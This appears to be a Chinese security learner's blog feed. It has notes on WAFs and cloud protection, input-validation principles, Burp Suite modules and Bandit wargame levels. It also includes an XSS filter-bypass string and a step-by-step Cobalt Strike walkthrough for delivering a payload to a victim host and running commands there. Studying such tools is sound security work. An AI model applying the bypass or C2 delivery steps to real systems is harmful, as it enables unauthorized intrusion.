<p>·文件内容安全防护</p>
<p>·命令执行漏洞防护</p>
<p>·远程文件包含防护</p>
</blockquote>
<p>3.定向漏洞利用防护</p>
<blockquote>
<p>·Web服务器漏洞防护</p>
<p>·Web插件漏洞防护</p>
</blockquote>
<p>伴随的主动检测方法有以下几种：</p>
<p>1.网络行为归类</p>
<p>正常的访问流量中，用户的正常流量占据主要份额。因此，WAF可将正常行为进行归类识别，并形成对应正常行为的字符串。再利用识别后得到的字符串进行匹配，对通过设备的流量进行预筛选，提高检测效率。</p>
<p>2.不同位置的主动检测</p>
<p>主动检测技术可通过在任意的HTTP头部字段、HTTP BODY字段中插入flag的方式对敏感行为进行标记，并针对后续行为进行观察，确认流量的合法性。</p>
<p>3.多种检测条件的逻辑组合</p>
<p>WAF支持将多个检测条件组合使用，并支持复杂规则的定义，用于为各类站点提供定制化的防护体系。</p>
<p>4.支持自定义规则</p>
<p>支持正则表达式、可在复杂业务场景下实现防护规则的自定义。</p>
<p>总体来说，WAF为Web站点提供了良好的安全防护效果，并为各种不同类型及应用的Web系统提供了一体化的防护解决方案。因此在使用这类设备时，要根据业务特性选择适用的规则，并且可根据自身站点的情况进行规则的自定义，以发挥设备最大的防护效果。</p>
<h2 id="1-2Apache-ModSecurity"><a href="#1-2Apache-ModSecurity" class="headerlink" title="1.2Apache ModSecurity"></a>1.2Apache ModSecurity</h2><p>ModSecurity是一个免费、开源的Apache模块，其功能是过滤各类在线攻击，因此可作为Web应用防火墙（WAF）使用。ModSecurity是一个入侵探测与阻止的引擎，它主要用于Web应用程序，所以也可以叫做Web应用程序防火墙。其官网地址为：<a href="http://www.modsecurity.org/%E3%80%82">http://www.modsecurity.org/。</a></p>
<p>需要说明的是，OWASP是一个安全社区，开发和维护着一套免费的应用程序保护规则，这就是OWASP的ModSecurity的<strong>核心规则集</strong>（即CRS）。可以通过ModSecurity手工创建安全过滤器、定义攻击并实现主动的安全输入验证。</p>
<blockquote>
<p>在实际应用中，利用ModSecurity对在线Web服务提供防护的场景并不很多，大多数安全运维人员反馈ModSecurity会极大降低当前服务器的性能，严重时会对正常的Web应用产生较大影响，包括访问延迟、可接受的并发连接极大减少等。这里暂不考虑这类问题，只是针对ModSecurity的防护原理及效果进行探讨，具体情况请根据实际的环境选择使用。</p>
</blockquote>
<p>ModSecurity的CRS提供了非常多的防护策略，如引入第三方IP信誉库来鉴别访问请求的合法性，并支持利用爬虫技术及防病毒技术保护服务器的安全，及针对各类Web攻击的防护脚本。以SQL注入防护模块为例，</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619162551197.png" alt="部分SQL注入防护规则"></p>
<p>常见的SQL注入攻击的payload种类均已包含在其中，这类<strong>利用黑名单手段来过滤参数语句的防护效果主要取决于payload的涵盖范围</strong>。因此，也可根据自有Web的情况来添加额外的payload，从而实现良好的防护效果。针对其他Web漏洞的防护思路也与此类似。总体来说<strong>，Modsecurity仍以关键字检查及防护过滤为主，并没有添加过多的动态流及业务效果的展示。</strong>而且，Modsecurity对性能的影响比较明显，因此在商业实践环境中利用的场景并不多，在防护效果上也可近似将Modsecurity<strong>理解为初级的软件WAF效果</strong>，建议在中小站点或内网访问量有限的环境下使用。</p>
<p>Modsecurity在易用程度方面有所欠缺，且由于Modsecurity仅适用于Apache，因此推荐使用国内的相关软件实现上述效果，这里推荐使用<strong>安全狗</strong>（<a href="http://www.safedog.cn/%EF%BC%89%E3%80%81D%E7%9B%BE%EF%BC%88http://www.d99net.net/%EF%BC%89%E7%AD%89%E9%98%B2%E6%8A%A4%E7%B1%BB%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4%E5%B7%A5%E4%BD%9C%E3%80%82">http://www.safedog.cn/）、D盾（http://www.d99net.net/）等防护类工具进行防护工作。</a></p>
<h2 id="1-3防篡改软件"><a href="#1-3防篡改软件" class="headerlink" title="1.3防篡改软件"></a>1.3防篡改软件</h2><p>防篡改软件的防护思路为：<strong>定期对Web页面进行监测，如发现异常，则立即告警并恢复页面</strong>。</p>
<p>通过直接监测页面，有异常直接告警并恢复，可保证Web应用的顺利开展。但是，防篡改软件仅仅能实现这类功能。</p>
<p>常见的防篡改检测方式有以下几种。</p>
<p>1）定期轮询方式</p>
<blockquote>
<p>用一个网页读取和检测程序，以<strong>轮询</strong>方式读出要监控的网页，与已经缓存好的真实网页进行比较，从而判断网页内容的完整性，<strong>对其中的修改内容进行合法性判断</strong>，并对被篡改的网页进行报警和恢复。</p>
</blockquote>
<p>（2）软件监控方式</p>
<blockquote>
<p>将篡改检测模块安装在Web服务器中，针对每次访问都进行完整性检查。<strong>对篡改网页及在线攻击行为进行实时访问阻断</strong>，并予以报警和恢复。在使用效果方面，这种方式类似于使用一套WAF系统，只不过是以软件形式，部署在服务器的网卡出口处进行防护。</p>
</blockquote>
<p>（3）事件触发方式</p>
<blockquote>
<p>利用操作系统的文件系统或驱动程序接口，通过程序检测网页文件当前状态。<strong>在网页文件被修改时进行合法性检查</strong>，对于非法操作进行报警和恢复。</p>
</blockquote>
<p>目前防篡改软件<strong>仅为事后防护机制</strong>。因此不推荐仅使用具有防篡改功能的防护类型工具。这只能解决表面的业务问题，对系统内的木马等情况，并没有很好的解决手段。当然，新的防护软件均附带监控攻击现状等功能，相当于在服务器层面安装了一套WAF，可实现在线的防护，而且也有相关免费软件的支持，如<strong>安全狗</strong>。</p>
<h2 id="1-4云防护系统"><a href="#1-4云防护系统" class="headerlink" title="1.4云防护系统"></a>1.4云防护系统</h2><p>针对中小规模网站的实际情况，受制于成本因素，通常会选择网络上的虚拟空间或虚拟主机来部署Web应用。但是，这又会受到虚拟空间或虚拟主机本身资源或各方面的限制，直接部署各类防护软件也不太现实；或者由于本地机房硬件条件的限制，无法额外部署一套硬件WAF设备进行防护。由于日常访问量较小，直接部署一套专业的商业WAF设备也意味着安全投入产出比并不十分理想。</p>
<p>为了解决硬件WAF成本过高、性能不佳以及需要机房环境等问题，研究人员开发了云防护系统。<strong>其防护思路为：网站管理者先将自己的域名解析地址指向云防护系统，那么在用户访问网站时，其访问的物理地址就变成了云防护系统的地址。云防护系统对用户的请求进行过滤后，再将请求发送给真实的Web服务器，从而实现在线防护。</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619164037788.png" alt="云防护系统的DNS解析"></p>
<p>在云防护系统的安全防护基础之上，传统的Web防护体系配合云的能力，可提供更加丰富的增值防护服务。例如，利用云的高性能及高带宽实现在线DDoS攻击流量过滤、实现在线缓存及备份功能等。而且管理方式简单易行，对Web应用无任何影响，适合个人用户及中小站点用户使用。</p>
<p>在防护效果方面，云防护系统在针对Web漏洞的防护方面与传统的WAF设备相比并没有大大区别，仍是以标准的漏洞防护方式（以参数过滤、参数转义）为主。因此，在防护效果方面，云防护系统与传统设备并没有明确的好坏之分，均可以提供在线防护能力。以国内某云防护系统为例，其针对在线攻击的防护效果良好。</p>
<p>综上，云防护系统主要优势在于：</p>
<blockquote>
<p>·基于云的硬件资源可有效保障防护性能，避免了传统设备由于硬件性能产生的网络瓶颈。</p>
<p>·只针对域名进行防护，这样也可支持CDN等方式，用户体验更佳。</p>
<p>·无需硬件设备，可有效减少用户的初始投资。</p>
<p>·基于大数据的防护样本分析，防护效果会进一步提升。</p>
</blockquote>
<p>当然，利用云防护系统还可较为简单地达到多Web应用的集中化管理的效果。相对于传统设备的规则库升级，集中管理的优势是可以将高危漏洞的响应时间缩短到小时级别，防护效果也能很好提升，并且给用户较多的防护选择空间。在实际安全防护工作开展中，可根据Web系统的真实防护需求选择使用。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>WEB防护技术与体系</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>WEB防护技术与体系</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全防护体系</title>
    <url>/2023/06/13/Web%E5%AE%89%E5%85%A8%E6%A0%B8%E5%BF%83%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="1-Web安全核心问题"><a href="#1-Web安全核心问题" class="headerlink" title="1.Web安全核心问题"></a>1.Web安全核心问题</h1><p>安全的核心问题是：用户可以提交任意输入，但从安全角度而言，用户所有输入均不可信。</p>
<p>1）用户侧可<strong>直接修改</strong>浏览器与服务器间<strong>传送的数据结构及内容</strong>。其中包括请求参数、Cookie内容和http消息头等方面。可轻易避开客户端执行的任何安全检测脚本，如各类型验证。</p>
<p>2）用户侧可在任意环节及功能上<strong>多次重复提交</strong>，并且服务器均会对重复提交的内容按照<strong>同一种逻辑进行处理</strong>，这样给攻击者实现爆破攻击的机会。</p>
<p>3）用户侧可利用浏览器、相关插件、攻击组件等多重方式<strong>对服务器进行探测</strong>，并且服务器没有有效手段控制用户侧所采用的工具类型。</p>
<p>4）部分业务逻辑依靠用户输入的参数进行业务开展，如显示用户名、用户自有信息等，从而增加了用户与系统的<strong>交互点</strong>。</p>
<h1 id="2-实际问题的客观引发因素"><a href="#2-实际问题的客观引发因素" class="headerlink" title="2.实际问题的客观引发因素"></a>2.实际问题的客观引发因素</h1><p>1）不健全的安全开发体系。</p>
<p>2）开发周期的缩短及功能频繁变更。</p>
<p>3）开发人员的不稳定性。</p>
<p>4）运维人员的安全意识不足。</p>
<h1 id="3-建立基本的安全框架"><a href="#3-建立基本的安全框架" class="headerlink" title="3.建立基本的安全框架"></a>3.建立基本的安全框架</h1><p>攻击者会利用各种具有服务器<strong>交互</strong>的业务功能进行各类攻击尝试，这也是Web漏洞存在的基本特点。因此在安全框架设计上，需重点关注Web应用与用户交互的方式及对应的业务流程。而且，要设计合理的用户交互规范，并对任何不应被信任的数据进行统一的过滤。</p>
<h2 id="3-1-处理用户交互权限"><a href="#3-1-处理用户交互权限" class="headerlink" title="3.1 处理用户交互权限"></a>3.1 处理用户交互权限</h2><p>在这个过程中，<strong>要具备完整的用户访问行为处理与过滤功能。</strong>通常情况下，可根据用户的<strong>交互行为进行分类</strong>，同时结合用户的<strong>身份权限</strong>进行综合处理，如常见的匿名用户、正常通过验证的用户和管理用户权限。许多情况下，不同用户只允许访问不同的数据，例如各类用户隐私数据、订单信息等内容。</p>
<p>目前，主流的Web应用使用三层相互关联的安全机制来处理用户访问。</p>
<p><strong>（1）用户身份验证方式</strong></p>
<blockquote>
<p>身份验证机制是Web应用识别用户身份的基本机制，如用户登录功能、利用OAuth授权功能等。在这个过程中，Web应用会重点验证用户的真实身份。如果不采用这类机制，应用程序应将所有用户作为匿名用户对待。目前，大多数Web应用程序采用标准的身份验证模型，即要求用户提交用户名和密码，再由应用程序对其进行核实，确认其合法性。</p>
</blockquote>
<p><strong>（2）用户会话管理</strong></p>
<blockquote>
<p>当用户通过了Web应用的身份验证方式后，用户可访问当前Web应用并使用对应的功能。在这个过程中，Web应用会收到不同用户发出的访问请求。这期间<strong>Web应用需识别并处理每一名用户提交的各种请求</strong>，并根据用户的身份权限实施有效的访问控制，实现管理用户的会话的功能。</p>
</blockquote>
<p>为了实现用户会话管理功能(<em><strong>跟踪用户并保持用户信息的技术</strong></em>)，Web应用在用户身份验证通过后会为每一个用户建立一个<strong>独立的Session</strong>，并向用户生成一个具有标识功能的<strong>令牌</strong>。<strong>Session本身是一组保存在服务器上的数据结构，用于追踪用户与Web应用的交互状态。</strong>这个过程中，Web应用会利用Cookie与Session机制来实现上述功能。</p>
<p><strong>（3）用户访问行为控制</strong></p>
<blockquote>
<p>Web应用需要对每个用户访问的访问请求做出响应。当前两个安全机制运作正常时，Web应用在接收到用户请求后会根据当前用户的身份状态及权限以及业务流程要求来决定响应或拒绝当前的请求。在此基础上，应用程序需要决定是否<strong>授权</strong>用户执行其所请求的操作或访问相关数据。</p>
</blockquote>
<h2 id="3-2处理用户输入参数"><a href="#3-2处理用户输入参数" class="headerlink" title="3.2处理用户输入参数"></a>3.2处理用户输入参数</h2><p>在用户输入参数的处理方面，有以下几个方式可供选择：</p>
<p>（1）利用黑名单过滤用户非法输入参数</p>
<blockquote>
<p>Web应用会使用一个<strong>黑名单</strong>来对用户输入的参数进行过滤。黑名单中包含一组在攻击中使用过的已知的字符串或特征。Web应用需阻止任何与黑名单匹配的数据进入，并对不符合黑名单的用户输入参数进行处理。</p>
</blockquote>
<p>（2）利用白名单校验用户参数是否为正常输入参数</p>
<blockquote>
<p>白名单是一种非常好的用户参数规范校验机制，相对于黑名单来说其过滤效果更加严格。因此<strong>适用于各类对参数格式及内容有着明确要求的业务场景</strong>。Web应用会将接收到的用户参数与白名单定义的规范进行匹配，并在匹配成功后执行后续业务流程。</p>
</blockquote>
<p>（3）使用安全的数据方式</p>
<blockquote>
<p>以不安全的方式处理用户提交的数据，容易造成Web应用错误地将用户输入参数作为代码执行，是许多Web应用程序漏洞形成的根本原因。在这种状况下，通常不需要确认输入本身的合法性，只要确保处理过程绝对安全，即可避免出现各类漏洞。例如，<strong>在数据库访问过程中使用参数化查询方式</strong>，即可避免绝大部分SQL注入攻击。</p>
</blockquote>
<p>（4）用户行为参数检查</p>
<blockquote>
<p>在一些业务流程漏洞中，攻击者提交的输入参数与普通的非恶意用户提交的输入参数完全相同，这就会导致上述三种防护手段均会失效。这类行为是因为攻击者提交参数时的目的不同。例如，攻击者可能会修改Web页面隐藏表单字段提交的参数，如订单编号，企图利用修改订单编号来实现访问行为越权。</p>
<p>因此，<strong>要在后台对用户的输入参数根据业务要求进行二次校验</strong>，方可避免这类问题的出现。</p>
</blockquote>
<h2 id="3-3确认用户应用边界"><a href="#3-3确认用户应用边界" class="headerlink" title="3.3确认用户应用边界"></a>3.3确认用户应用边界</h2><p>仅利用JS脚本来检查用户输入内容完全无法保证到达服务器的数据一定符合要求。服务器端应用程序第一次收到用户数据的地方是一个<strong>重要的信任边界</strong>，应用程序需要在此采取措施防御恶意输入。</p>
<p><strong>边界确认</strong>是一种更加有效的模型。此时，服务器端应用程序的每一个单独组件或功能应将用户输入参数当作潜在的恶意来源。除客户端与服务器之间的外部边界外，Web应用程序在上述每一个信任边界上执行数据合法性确认。</p>
<h2 id="3-4处理流程规范化"><a href="#3-4处理流程规范化" class="headerlink" title="3.4处理流程规范化"></a>3.4处理流程规范化</h2><p>在确认检查过程中，当需要在<strong>几个步骤中处理用户提交的输入</strong>时，就会出现一个输入处理机制经常遇到的问题，即<strong>如何确认用户数的参数完全合法</strong>。如果不谨慎处理该过程，攻击者就能寻找到有效的绕过方式，使得恶意数据成功避开Web应用的防护机制。例如，Web应用试图通过删除用户输入参数中的某些非法字符或表达式来过滤用户输入参数时，就会出现这种问题。</p>
<p>以防御某些跨站点脚本攻击的方法为例，应用程序可能会从任何用户提交的数据中删除表达式：</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<hr>
<p>但攻击者可应用以下输入避开过滤器：</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>

<p>数据规范化会造成另外一个问题。当用户浏览器发起HTTP请求时，浏览器会将请求中的用户参数进行各种形式的编码。HTTP协议之所以使用URL编码等方案，是为了能够通过HTTP协议传送不常见的字符与二进制数据。在这个过程中，Web应用<strong>需提前将这类编码数据进行规范的转换</strong>。如果在对用户参数过滤之后再执行编码转换，攻击者就可以通过使用编码方式避开现有的防护机制。</p>
<p>安全开发流程的核心思想是：在遵循系统功能要求的基础上，需在<strong>系统内部链接、外部传参点等各个环节中，实现标准化的防护方式及业务流程</strong>。重点在于系统交互功能的设计上。这样可在开发阶段降低各类安全风险，一方面可保证系统的稳定运行，另一方面也可减少安全防护的资金投入。</p>
]]></content>
      <categories>
        <category>Web安全防护体系</category>
        <category>《WEB安全基础》</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>Web安全防护体系</tag>
      </tags>
  </entry>
  <entry>
    <title>Web源码拓展</title>
    <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
<p>电商-业务逻辑突出</p>
<p>论坛-xss逻辑突出</p>
<p>博客-漏洞较少</p>
<p>第三方-功能决定</p>
<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
<p>CMS识别-即是否套用了模板</p>
<p>开源-找漏洞和审计</p>
<p>内部-渗透测试</p>
<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>Web源码拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>cs</title>
    <url>/2023/06/25/cs%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>cobalt strike分为客户端和服务端。</p>
<p>一般kali启动teamserver</p>
<p>主机启动客户端。</p>
<h2 id="1-启动"><a href="#1-启动" class="headerlink" title="1.启动"></a>1.启动</h2><p>kali中</p>
<blockquote>
<p>.&#x2F;teamserver ip地址 密码</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629162433741.png"></p>
<blockquote>
<p>.&#x2F;cobaltsrike启动客户端</p>
<p>ip地址对应与密码对应</p>
<p>端口随便，名称随便</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629163431332.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629163445909.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629163501842.png"></p>
<h2 id="2-监听"><a href="#2-监听" class="headerlink" title="2.监听"></a>2.监听</h2><blockquote>
<p>配置监听器，ip地址不变，端口换另一个，如8080</p>
</blockquote>
<blockquote>
<p>攻击-&gt;web漏洞-&gt;web投递</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629163946063.png"></p>
<p>复制生成的payload在目标机中执行即可</p>
<p><strong>受害者可能是链接触发，下载捆绑文件触发，邮件触发等。</strong></p>
<p>为演示效果，在受害机直接cmd运行该payload。</p>
<p>攻击机出现：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629164955828.png"></p>
<p>ip地址均为目标机。</p>
<h2 id="3-交互"><a href="#3-交互" class="headerlink" title="3.交互"></a>3.交互</h2><blockquote>
<p>右键-&gt;会话交互</p>
</blockquote>
<p>在beacon下输入:shell whoami</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230629165406370.png"></p>
<p>后续可以搭配msf免杀</p>
<h2 id="4-注意"><a href="#4-注意" class="headerlink" title="4.注意"></a>4.注意</h2><p>监听成功后，最后设置sleep 1等操作，默认是60响应一次，我连上没多久，只成功过shell whoami了，估计是超时了。</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>bp工具</title>
    <url>/2023/05/13/bp%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>抓包；爆破；repeat尝试；ssrf表单伪造；编码解码</p>
<p>注意里面的空格用+或%20代替</p>
<blockquote>
<p>POST &#x2F;sqli&#x2F;9.php?a&#x3D;1236 HTTP&#x2F;1.1</p>
</blockquote>
<p>否则被认为是如HTTP&#x2F;1.1这种独立的数值</p>
<h2 id="spider模块"><a href="#spider模块" class="headerlink" title="spider模块"></a>spider模块</h2><p>Spider的蜘蛛爬行功能可以帮助我们了解系统的结构，其中Spider爬取到的内容将在Target中展示，如图3-24所示，界面左侧为一个主机和目录树，选择具体某一个分支即可查看对应的请求与响应。</p>
<h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><p>Burp中自带的编码解码及散列转换的工具，能对原始数据进行各种编码格式和散列的转换。</p>
<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>用于自动检测Web系统的各种漏洞。</p>
<p>分为主动扫描和被动扫描，可以在Target对分支操作，也可以去http history里</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144628926.png"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144833459.png"></p>
<p>扫完后，可以右击Burp Target站点地图选项下的链接，依次选择“issues”→“Report issues”选项，然后导出漏洞报告</p>
<h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><p>当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。这种模式下的操作会产生大量的请求和应答数据，直接影响服务端的性能，通常用于非生产环境。主动扫描适用于以下这两类漏洞。</p>
<p>● <strong>客户端的漏洞，如XSS、HTTP头注入、操作重定向。</strong></p>
<p>● <strong>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</strong></p>
<p>对第一类漏洞，Burp在检测时会提交input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的；</p>
<p>对第二类漏洞，以SQL注入为例，服务端有可能返回数据库错误提示信息，也有可能什么都不反馈。Burp在检测过程中会采用各个技术验证漏洞是否存在，例如诱导时间延迟、强制修改Boolean值、与模糊测试的结果进行比较，以提高漏洞扫描报告的准确性。</p>
<h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><p>当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全，通常适用于生产环境的检测。一般来说，下列漏洞在被动模式中容易被检测出来。</p>
<p>● 提交的密码为未加密的明文。</p>
<p>● 不安全的cookie的属性，例如缺少HttpOnly和安全标志。</p>
<p>● cookie的范围缺失。</p>
<p>● 跨域脚本包含和站点引用泄露。</p>
<p>● 表单值自动填充，尤其是密码。</p>
<p>● SSL保护的内容缓存。</p>
<p>● 目录列表。</p>
<p>● 提交密码后应答延迟。</p>
<p>● session令牌的不安全传输。</p>
<p>● 敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露。</p>
<p>● 不安全的ViewState的配置。</p>
<p>● 错误或不规范的Content-Type指令。</p>
<p>这种扫描避免了平时测试破坏的可能。</p>
<h2 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>可以对Web应用程序进行自动化攻击，如通过标识符枚举用户名、ID和账户号码，模糊测试，SQL注入，跨站，目录遍历等。</p>
<p>工作原理是Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload），在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。Burp Intruder通常被应用于以下场景。</p>
<p>Intruder适用场景如：</p>
<blockquote>
<p>● 标识符枚举。Web应用程序经常使用标识符引用用户、账户、资产等数据信息。例如，用户名、文件ID和账户号码。</p>
<p>● 提取有用的数据。在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其个人空间的名字和年龄。</p>
<p>● 模糊测试。很多输入型的漏洞（如SQL注入、跨站点脚本和文件路径遍历）可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
</blockquote>
<p>一般需要你有很好的字典，才可以有效地进行爆破、遍历。</p>
<p>它有几个常见的模式</p>
<blockquote>
<p>● Sniper模式使用单一的Payload组。它会针对每个位置设置Payload。这种攻击类型适用于对常见漏洞中的<strong>请求参数单独进行Fuzzing测试</strong>的情景。攻击中的请求总数应该是position数量和Payload数量的乘积。</p>
<p>● Battering ram模式使用单一的Payload组。它会重复Payload并一次性把所有相同的Payload放入指定的位置中。这种攻击适用于需要在请求中<strong>把相同的输入放到多个位置的情景</strong>。请求的总数是Payload组中Payload的总数。</p>
<p>● Pitchfork模式使用多个Payload组。攻击会同步迭代所有的Payload组，把Payload放入每个定义的位置中。这种攻击类型非常适合<strong>在不同位置中需要插入不同但相似输入的情况</strong>。请求的数量应该是最小的Payload组中的Payload数量。</p>
<p>● Cluster bomb模式会使用多个Payload组。每个定义的位置中有不同的Payload组。攻击会迭代每个Payload组，每种Payload组合都会被测试一遍。这种攻击适用于在位置中<strong>需要不同且不相关或者未知输入攻击的情景</strong>。攻击请求的总数是各Payload组中Payload数量的乘积。</p>
</blockquote>
<p>对Status或Length的返回值进行排序，有不同之处，则认为破解成功</p>
<p>盲注一般也会依靠这个，但更多是用脚本。</p>
<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>手动修改、补发个别HTTP请求，并分析它们的响应的工具。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</p>
<p>bp有四种类型显示数据包</p>
<p>● Raw主要显示Web请求的raw格式，以纯文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，可以通过手动修改这些信息，对服务器端进行渗透测试。</p>
<p>● Params主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数。可以通过修改这些请求参数完成对服务器端的渗透测试。</p>
<p>● Headers中显示的是数据包中的头信息，以名称、值的形式显示数据包。</p>
<p>● Hex对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用</p>
<p>不想重复捕获，要反复测试时，可以将包放进repeater模块。</p>
<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>提供一个可视化的差异比对功能，来对比分析两次数据之间的区别</p>
<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌（Session token）、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>bp工具</tag>
      </tags>
  </entry>
  <entry>
    <title>bandit(level 0-19)</title>
    <url>/2023/05/14/bandit-level-0-19/</url>
    <content><![CDATA[<h1 id="bandit"><a href="#bandit" class="headerlink" title="bandit"></a>bandit</h1><h2 id="字符作用"><a href="#字符作用" class="headerlink" title="字符作用"></a>字符作用</h2><blockquote>
<p>| 表示管道，上一条命令的输出，作为下一条命令参数，通常用来过滤&#x2F;汇总数据。</p>
</blockquote>
<blockquote>
<p>&amp;&amp;表示前一条命令执行成功时，才执行后一条命令；反之，前面的命令执行失败，则&amp;&amp;后面的命令不会被执行。</p>
</blockquote>
<blockquote>
<p>&amp;表示任务在后台执行，即使ssh窗口关闭，服务依然会在后台持续运行。</p>
</blockquote>
<blockquote>
<p>||表示上一条命令执行失败后，才执行下一条命令。一旦执行到一条成功的命令，后面用****||****连接的命令，就不会再被执行。</p>
</blockquote>
<blockquote>
<p>＞把正常信息（剔除错误信息）重定向到另一个文件内</p>
<p><em><strong>*2&gt;*</strong></em> &#x2F;dev&#x2F;null意思就是把错误输出到“黑洞” ，不会显示在屏幕上。</p>
</blockquote>
<p><a href="https://blog.csdn.net/succing/article/details/127355545?ops_request_misc=%7B%22request_id%22:%22168405323416800215011812%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168405323416800215011812&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127355545-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=linux">Linux技巧(六)：命令尾部&amp;的作用 &amp;&amp;、|、||、；、()、&amp;＞、 2＞&amp;1 的用法和区别，很实用_linux &amp;_血煞长虹的博客-CSDN博客</a></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>我用的windows，下载了mobaXterm用于进行ssh连接</p>
<p>是说level 1的密码呢在readme文件中，用到cat 找出来即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230513211057882.png" alt="image-20230513211057882"></p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>exit，然后r，重新建立连接，login as bandit1，密码是上级找到的</p>
<p>密码在虚线文件名中，这时候cat -就不管用了。指定文件完整路径即可。</p>
<p><img src="/image-20230513212947940.png" alt="image-20230513212947940"></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>文件名有空格</p>
<p>使用引号括起来</p>
<p><img src="/image-20230513214101452.png" alt="image-20230513214101452"></p>
<p>aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG</p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>说是在inhere目录下的隐藏文件中</p>
<p>需要用到ls -a命令查看隐藏</p>
